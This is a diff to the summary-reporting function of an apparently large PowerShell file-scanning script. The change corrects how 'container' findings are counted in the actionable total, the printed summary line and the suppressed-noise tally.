@@ -4203,11 +4602,12 @@ function Write-CleanSummary {
     }).Count
     $suppressed = ($script:HighFindings.Count - $high.Count - $commented.Count) +
                   ($script:KeyFindings.Count - $keys.Count) +
+                  ($script:Guaranteed.Count - $containers.Count) +
                   ($script:Interesting.Count - $cleanInteresting.Count) +
                   ($high.Count - $nHigh)
-    $script:CleanActionableCount = $nHigh + $keys.Count + $script:Guaranteed.Count
+    $script:CleanActionableCount = $nHigh + $keys.Count + $containers.Count
     Write-CleanLine ("  HIGH: {0}  KEY: {1}  CONTAINERS: {2}  ENCRYPTED_LEADS: {3}  LEADS: {4}  OTHER_INTEREST: {5}  NOISE_SUPPRESSED: {6}  NAME: {7}  SKIPPED: {8}" -f `
-        $nHigh, $keys.Count, $script:Guaranteed.Count,
+        $nHigh, $keys.Count, $containers.Count,
         $encrypted.Count, ($leads.Count + $commented.Count), $other.Count, $suppressed,
         $script:SuspiciousNamesFound.Count, $script:SkippedFiles.Count)
 
